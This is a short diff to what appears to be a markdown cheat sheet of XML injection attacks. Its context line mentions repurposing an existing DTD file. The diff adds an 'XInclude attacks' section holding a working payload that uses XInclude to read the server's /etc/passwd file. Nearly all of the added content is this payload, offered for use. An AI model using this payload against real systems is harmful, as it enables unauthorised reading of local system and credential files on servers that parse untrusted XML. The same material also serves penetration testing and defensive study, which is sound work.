@@ -168,3 +168,8 @@ Locating an existing DTD file to repurpose:
 ```
 test a list of common DTD files to locate a file that is present
 
+### XInclude attacks
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
